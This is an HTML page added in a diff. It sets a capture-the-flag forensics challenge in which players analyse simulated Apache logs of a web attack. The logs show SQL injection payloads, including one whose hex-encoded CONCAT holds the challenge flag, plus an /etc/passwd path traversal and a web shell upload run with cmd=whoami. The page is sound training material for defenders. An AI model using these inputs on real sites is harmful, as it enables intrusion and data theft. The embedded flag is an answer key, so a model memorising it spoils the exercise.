@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOC Analyst - Log Analysis Challenge</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #22d3ee;
+            padding: 20px;
+            margin: 0;
+            min-height: 100vh;
+            font-size: 12px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(15, 23, 42, 0.95);
+            border: 2px solid #22d3ee;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 0 30px rgba(34, 211, 238, 0.3);
+        }
+        h1 {
+            text-align: center;
+            color: #fbbf24;
+            text-shadow: 0 0 10px rgba(251, 191, 36, 0.8);
+            margin-bottom: 5px;
+            font-size: 20px;
+        }
+        .subtitle { text-align: center; color: #64748b; margin-bottom: 20px; font-size: 12px; }
+        .mission-box {
+            background: #1c1917;
+            border: 2px solid #fbbf24;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+        }
+        .mission-box h3 { color: #fbbf24; margin: 0 0 10px 0; font-size: 13px; }
+        .mission-box ol { color: #e2e8f0; margin: 0; padding-left: 18px; font-size: 11px; }
+        .mission-box li { margin: 4px 0; }
+        .log-viewer {
+            background: #0f172a;
+            border: 2px solid #334155;
+            border-radius: 6px;
+            margin: 15px 0;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .log-header {
+            background: #1e293b;
+            padding: 10px 15px;
+            border-bottom: 1px solid #334155;
+            color: #22d3ee;
+            font-weight: bold;
+            font-size: 12px;
+            position: sticky;
+            top: 0;
+        }
+        .log-content { padding: 10px; font-size: 10px; line-height: 1.4; }
+        .log-line { margin: 2px 0; padding: 2px 5px; border-radius: 2px; }
+        .log-normal { color: #94a3b8; }
+        .log-suspicious { background: #7f1d1d; color: #fecaca; }
+    </style>
+</head>
+<body>
+<div class="container">
+<h1>🔍 SOC ANALYST - LOG ANALYSIS</h1>
+<div class="subtitle">Digital Forensics — Medium | 50 Points</div>
+<div class="mission-box">
+<h3>🚨 INCIDENT ALERT</h3>
+<ol>
+<li>Our web server detected suspicious activity at 14:23 UTC</li>
+<li>Multiple failed login attempts followed by successful compromise</li>
+<li>Analyze the Apache access logs to identify the attack vector</li>
+<li>Find the attacker's IP address and trace their actions</li>
+<li>The flag was extracted using SQL injection with hex encoding</li>
+<li>you can use cyber chef tool for hex opertions </li>
+</ol>
+</div>
+<div class="log-viewer">
+<div class="log-header">📋 Apache Access Logs - /var/log/apache2/access.log</div>
+<div class="log-content">
+<div class="log-line log-normal">192.168.1.100 - - [20/Mar/2026:14:15:23 +0000] "GET / HTTP/1.1" 200 2326 "-" "Mozilla/5.0"</div>
+<div class="log-line log-normal">192.168.1.101 - - [20/Mar/2026:14:16:45 +0000] "GET /login.php HTTP/1.1" 200 1543 "-" "Mozilla/5.0"</div>
+<div class="log-line log-normal">192.168.1.102 - - [20/Mar/2026:14:17:12 +0000] "POST /login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0"</div>
+<div class="log-line log-normal">192.168.1.103 - - [20/Mar/2026:14:18:33 +0000] "GET /dashboard.php HTTP/1.1" 200 4521 "-" "Mozilla/5.0"</div>
+<div class="log-line" style="color:#fbbf24;">203.0.113.45 - - [20/Mar/2026:14:19:15 +0000] "GET /admin/ HTTP/1.1" 403 1234 "-" "curl/7.68.0"</div>
+<div class="log-line log-normal">192.168.1.104 - - [20/Mar/2026:14:20:01 +0000] "GET /contact.php HTTP/1.1" 200 2156 "-" "Mozilla/5.0"</div>
+<div class="log-line" style="color:#fbbf24;">203.0.113.45 - - [20/Mar/2026:14:20:33 +0000] "GET /admin/login.php HTTP/1.1" 200 1876 "-" "curl/7.68.0"</div>
+<div class="log-line" style="color:#ef4444;">203.0.113.45 - - [20/Mar/2026:14:21:12 +0000] "POST /admin/login.php HTTP/1.1" 401 567 "-" "curl/7.68.0"</div>
+<div class="log-line" style="color:#ef4444;">203.0.113.45 - - [20/Mar/2026:14:21:45 +0000] "POST /admin/login.php HTTP/1.1" 401 567 "-" "curl/7.68.0"</div>
+<div class="log-line" style="color:#ef4444;">203.0.113.45 - - [20/Mar/2026:14:22:18 +0000] "POST /admin/login.php HTTP/1.1" 401 567 "-" "curl/7.68.0"</div>
+<div class="log-line log-normal">192.168.1.105 - - [20/Mar/2026:14:22:55 +0000] "GET /products.php HTTP/1.1" 200 3421 "-" "Mozilla/5.0"</div>
+<div class="log-line log-suspicious">203.0.113.45 - - [20/Mar/2026:14:23:01 +0000] "GET /admin/login.php?user=admin&pass=' OR '1'='1 HTTP/1.1" 200 1876 "-" "curl/7.68.0"</div>
+<div class="log-line log-suspicious">203.0.113.45 - - [20/Mar/2026:14:23:15 +0000] "POST /admin/login.php HTTP/1.1" 302 0 "user=admin&pass=' UNION SELECT 1,2,'admin',md5('password123') --" "curl/7.68.0"</div>
+<div class="log-line" style="color:#ef4444;">203.0.113.45 - - [20/Mar/2026:14:23:32 +0000] "GET /admin/dashboard.php HTTP/1.1" 200 5643 "-" "curl/7.68.0"</div>
+<div class="log-line log-suspicious">203.0.113.45 - - [20/Mar/2026:14:23:48 +0000] "GET /admin/users.php?id=1' UNION SELECT 1,2,3,4,CONCAT(0x666c61677b,0x6c30675f346e346c797331735f6d3473743372,0x7d),6 -- HTTP/1.1" 200 2341 "-" "curl/7.68.0"</div>
+<div class="log-line log-normal">192.168.1.106 - - [20/Mar/2026:14:24:12 +0000] "GET /about.php HTTP/1.1" 200 1987 "-" "Mozilla/5.0"</div>
+<div class="log-line log-suspicious">203.0.113.45 - - [20/Mar/2026:14:24:33 +0000] "GET /admin/config.php?file=../../../etc/passwd HTTP/1.1" 200 1543 "-" "curl/7.68.0"</div>
+<div class="log-line log-normal">192.168.1.107 - - [20/Mar/2026:14:25:01 +0000] "GET /services.php HTTP/1.1" 200 2876 "-" "Mozilla/5.0"</div>
+<div class="log-line log-suspicious">203.0.113.45 - - [20/Mar/2026:14:25:22 +0000] "POST /admin/upload.php HTTP/1.1" 200 234 "filename=shell.php" "curl/7.68.0"</div>
+<div class="log-line" style="color:#ef4444;">203.0.113.45 - - [20/Mar/2026:14:25:45 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 12 "-" "curl/7.68.0"</div>
+<div class="log-line log-normal">192.168.1.108 - - [20/Mar/2026:14:26:15 +0000] "GET /news.php HTTP/1.1" 200 3254 "-" "Mozilla/5.0"</div>
+<div class="log-line" style="color:#22d3ee;">203.0.113.45 - - [20/Mar/2026:14:26:42 +0000] "GET /admin/export.php?format=json&data=exfiltrated HTTP/1.1" 200 891 "-" "curl/7.68.0"</div>
+</div>
+</div>
+<div style="text-align:center;margin-top:20px;color:#475569;font-size:10px;">
+<p>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
+<p>🎓 Gandhinagar University — Tech Xtreme 2026</p>
+<p>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
+</div>
+</div>
+</body>
+</html>
